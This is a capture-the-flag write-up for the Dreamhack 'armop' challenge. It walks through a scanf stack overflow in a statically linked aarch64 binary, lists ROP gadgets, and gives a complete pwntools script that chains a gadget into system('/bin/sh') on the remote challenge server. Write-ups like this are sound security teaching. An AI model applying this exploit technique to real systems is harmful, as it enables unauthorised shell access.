+++
date = '2026-05-10'
draft = false
title = 'Dreamhack armop Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
It's not AMD64, Very Unusual!

Hint

---

    For debug, USE GIVEN UTILS

    Stack structure is different from x86_64. You should understand the stack structure of aarch64.

---

[This](https://blog.perfect.blue/ROPing-on-Aarch64) explains arm stuff pretty quickly.

Since this is `aarch64`, and I have the poor people IDA, we have to use Ghidra this time.

Let's take a look at the functions:

```c

undefined8 main(void)

{
  int iVar1;
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  iVar1 = system("echo \'exploit aarch64!\n\'");
  run(iVar1);
  return 0;
}
```

```c

void run(void)

{
  undefined1 auStack_10 [16];
  
  ___printf_chk(2,"input: ");
  __isoc99_scanf(&DAT_00467050,auStack_10);
  return;
}
```

(`&DAT_00467050` is `%s`)



## Identifying the vulnerabilities

And I scanned through the memory, and found:

```bash
DEFINED	004671c8	s_/bin/sh_004671c8	ds "/bin/sh"	"/bin/sh"	string	8	false
```

So we need a simple `pop rdi; ret` type thing; We already have `system` and `/bin/sh` in memory.

That's like a `ldr x0, [sp]` for the argument, `ldr x30, [sp]` for the function, and `ret`.

I found some interesting gadgets with ropper:

```bash
0x0000000000435e38: ldr x0, [sp, #0x60]; ldp x29, x30, [sp], #0x80; ret; 
0x000000000045bc60: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret; 
0x000000000045914c: ldr x0, [sp, #0x80]; ldp x29, x30, [sp], #0xb0; ret; 
0x00000000004426a4: ldr x0, [sp]; ldp x29, x30, [sp, #0xf0]; add sp, sp, #0x150; ret; 
0x0000000000400588: ldp x29, x30, [sp], #0x20; ret;
```

So if I got arm gadgets correctly: 

`padding to x30 > gadget > fakex29 > fakex30 > `

`> padding to sp+0x60 > fakex0`. 

What's weird is that this is `system`:

```bash
pwndbg> info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0x0000000000401630  do_system
0x0000000000401b00  __libc_system
0x0000000000401b00  system
```

But, whatever. I'm guessing this is statically linked. Good for us I guess.

Then the most amazing and unbelievable thing happened - I got the script right FIRST TRY! I didn't even have to open the debugger for this!!!

Anyways, we can just connect remotely and grab the flag now.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/armop/deploy/prob')

context.arch = 'aarch64'
cyberedu = 'host8.dreamhack.games:18437'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

system = 0x0401b00
binsh = 0x004671c8
#0x0000000000435e38: ldr x0, [sp, #0x60]; ldp x29, x30, [sp], #0x80; ret; 
gadget = 0x435e38

payload = ( b"A" * 16 + #padding to x29
            b"B" * 8 + #x29
            p64(gadget) +
            p64(0x0) + #we dont care abt x29
            p64(system) + #we wrote up to sp + 0x10
            b"A"*0x50 +
            p64(binsh)
          )
            
p.sendline(payload)    
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/armop.py)**.
